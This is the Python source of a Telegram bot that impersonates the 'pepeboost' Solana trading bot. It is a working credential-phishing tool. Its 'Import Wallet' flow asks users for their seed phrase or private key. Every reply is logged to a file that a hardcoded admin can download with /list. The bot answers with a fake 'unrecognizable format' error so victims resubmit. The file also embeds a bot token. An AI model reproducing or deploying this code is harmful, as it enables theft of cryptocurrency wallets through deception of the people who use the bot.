import asyncio
import time
from datetime import datetime
import os
from aiohttp import web
import aiofiles
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, filters, ContextTypes, MessageHandler
from typing import Final

# Token and configurations
TOKEN: Final = '7523077804:AAEWFJuuqYYO14TkBAwCuVvWdQWWeZaGoR4'
BOT_USERNAME: Final = '@pepeboost_soll_bot'
LOG_FILE_PATH: Final = 'user_messages.txt'
ADMIN_USER_ID = 5551837706
PORT = int(os.environ.get('PORT', '8080'))

# Initialize bot application
bot_application = None

async def healthcheck():
    """Health check endpoint for Render"""
    app = web.Application()
    
    async def handle(request):
        return web.Response(text="Bot is running!")
    
    app.router.add_get('/', handle)
    
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', PORT)
    await site.start()
    print(f"Health check server started on port {PORT}")
    return runner

async def list(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """处理 /getlogs 命令，发送 user_messages.txt 的内容"""
    print(f"Received /list command from user {update.effective_user.id}")
    user = update.effective_user
    if user.id != ADMIN_USER_ID:
        await update.message.reply_text("🔗 Please import a wallet to start\n\n请先绑定钱包")
        return

    try:
        async with aiofiles.open('user_messages.txt', mode='r', encoding='utf-8') as f:
            content = await f.read()
        if len(content) > 4000:
            async with aiofiles.open('user_messages.txt', mode='rb') as f:
                await update.message.reply_document(document=f, filename='user_messages.txt')
        else:
            await update.message.reply_text(content or "日志文件为空。")
    except Exception as e:
        print(f"Error in /list command: {e}")
        await update.message.reply_text(f"无法读取日志文件: {e}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """处理 /start 命令"""
    print(f"Received /start command from user {update.effective_user.id}")
    keyboard = [
        [InlineKeyboardButton("🔌 Import Wallet / 绑定钱包", callback_data='link_wallet')],
        [InlineKeyboardButton("💰 Trade / 交易", callback_data='trade')],
        [InlineKeyboardButton("💴 Withdraw / 提现", callback_data='withdraw')],
        [InlineKeyboardButton("💳 My Wallet / 查看我的钱包", callback_data='my_wallet')],
        [InlineKeyboardButton("📖 Help / 帮助", callback_data='help')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    message = (
        "Welcome to pepeboost, extremely fast solana trading bot. ⚡️Support Pumpfun tokens, Snipe, and Limit orders.\n\n"
        "⚡️欢迎使用pepeboost sol交易机器人"
    )
    await update.message.reply_text(message, reply_markup=reply_markup)
    print("Start message sent successfully")

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """处理按钮回调"""
    print(f"Received button callback: {update.callback_query.data}")
    query = update.callback_query
    await query.answer()

    if query.data == 'link_wallet':
        response_text = 'Please enter wallet secret phrase or private key.\n\n请输入您的助记词或私钥'
    elif query.data == 'trade':
        response_text = '🔗 Please import a wallet to start\n\n请先绑定钱包'
    elif query.data == 'withdraw':
        response_text = '🔗 Please import a wallet to start\n\n请先绑定钱包'
    elif query.data == 'my_wallet':
        response_text = '🔗 Please import a wallet to start\n\n请先绑定钱包'
    elif query.data == 'help':
        response_text = (
            "⭐️ What should I do if the bot is lagging?\n"
            "If the bot is lagging, it's recommended to switch to another bot. "
            "Avoid using Bot0 as it tends to lag due to high traffic.\n\n"
            "⭐️ How do I check my holdings after buying?\n"
            "Click on 'Assets' to view your last 20 token transactions and holdings, "
            "showing real-time data. Click 'Pending Orders' for long-term data, "
            "which may be slower due to caching.\n\n"
            "⭐️ Which tokens are supported for trading?\n"
            "The bot supports SOL trading pairs from most Raydium pools. "
            "ORCA pool trading is not supported.\n\n"
            "⭐️ What are the trading fees?\n"
            "There is a 0.5% fee for both buying and selling. "
            "For example, if you buy/sell 1 SOL, the trading fee is 0.005 SOL.\n\n"
            "⭐️ How do I transfer SOL from my wallet?\n"
            "Click 'Withdraw,' select 'Transfer SOL,' and enter the amount and address to transfer.\n\n"
            "⭐️机器人卡顿怎么办？\n"
            "机器人卡顿，建议切换机器人。不推荐使用Bot0，人数过多易卡顿。\n\n"
            "⭐️买入后如何查看持仓？\n"
            "点击资产查看最近交易的20笔代币和持仓，展示实时数据。点击挂单适合较长期数据，有缓存会慢一些\n\n"
            "⭐️支持交易哪些代币？\n"
            "绝大多数Raydium池子的SOL交易对，不支持ORCA池子交易\n\n"
            "⭐️交易手续费收多少？\n"
            "买/卖均收取0.5%的交易手续费。例如买入/卖出1SOL，交易手续费0.005 SOL\n\n"
            "⭐️钱包里面的SOL如何转出？\n"
            "点击提现 ，选择'转出SOL'，输入转出金额和地址即可\n\n"
            "For more information on how to use the bot, visit:\n"
            "https://docs.pepeboost.io/ – including settings for trading parameters and more.\n\n"
            "🌐 Official Support Group: https://t.me/pepeboost_support\n"
            "🐦 https://twitter.com/PepeBoost888"
        )
    else:
        response_text = "请点击按钮 'Link Your Wallet / 绑定钱包' 来绑定您的钱包。"

    await query.message.reply_text(response_text)
    print(f"Button callback response sent: {query.data}")

async def handle_random_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """处理随机消息"""
    print(f"Received message: {update.message.text}")
    user = update.message.from_user
    user_id = user.id
    username = user.username or user.full_name
    user_text = update.message.text

    log_entry = f"UserID: {user_id} | Username: {username} | Message: {user_text}\n"

    try:
        async with aiofiles.open(LOG_FILE_PATH, mode='a', encoding='utf-8') as f:
            await f.write(log_entry)
        print(f"Message logged: {log_entry.strip()}")
    except Exception as e:
        print(f"Error logging message: {e}")

    user_text = update.message.text.lower()
    if 'hello' in user_text or 'hi' in user_text:
        response = "Hello! 👋 如何我可以帮助您？"
    elif 'wallet' in user_text:
        response = "请点击按钮 'Link Your Wallet / 绑定钱包' 来绑定您的钱包。"
    else:
        time.sleep(3)
        response = "❌ The format of the phrase or key entered is unrecognizable\n输入的私钥地址格式有误或无法识别"

    await update.message.reply_text(response)
    print("Random message response sent")

async def main():
    global bot_application
    
    print("Starting bot application...")
    
    # 创建 Application 对象
    bot_application = Application.builder().token(TOKEN).build()

    # 添加处理器
    bot_application.add_handler(CommandHandler('start', start))
    bot_application.add_handler(CommandHandler('list', list))
    bot_application.add_handler(CallbackQueryHandler(button_callback))
    bot_application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_random_message))

    # 启动健康检查服务器
    runner = await healthcheck()
    
    print("Starting bot polling...")
    await bot_application.initialize()
    await bot_application.start()
    await bot_application.run_polling(allowed_updates=Update.ALL_TYPES)
    
    try:
        print("Bot is running...")
        await asyncio.Event().wait()
    except Exception as e:
        print(f"Error in main: {e}")
    finally:
        await runner.cleanup()
        await bot_application.stop()

if __name__ == '__main__':
    print("Starting script...")
    asyncio.run(main())
